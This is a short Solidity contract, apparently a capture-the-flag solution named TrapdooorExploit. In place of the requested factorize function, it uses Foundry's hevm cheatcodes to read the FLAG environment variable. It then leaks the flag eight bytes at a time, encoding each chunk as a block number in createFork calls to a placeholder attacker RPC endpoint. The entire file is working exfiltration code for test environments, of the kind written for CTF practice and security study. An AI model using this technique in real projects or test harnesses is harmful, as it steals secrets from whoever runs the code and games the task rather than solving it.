// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

interface Vm {
    function envString(string calldata) external returns (string memory);
    function createFork(string calldata, uint256) external returns (uint256);
}

contract TrapdooorExploit {
    function factorize(uint256) external returns (uint256, uint256) {
        address VM_ADDRESS = address(bytes20(uint160(uint256(keccak256("hevm cheat code")))));
        Vm vm = Vm(VM_ADDRESS);
        string memory flag = vm.envString("FLAG");
        bytes memory flagb = bytes(flag);
        uint64 x = 0;
        for (uint256 i = 0; i < flagb.length; i++) {
            x <<= 8;
            x += uint64(uint8(flagb[i]));
            if (i % 8 == 7) {
                try vm.createFork("<RPC_LEAK>", x) {} catch {}
                x = 0;
            }
        }
        try vm.createFork("<RPC_LEAK>", x) {} catch {}
        return (0, 0);
    }
}
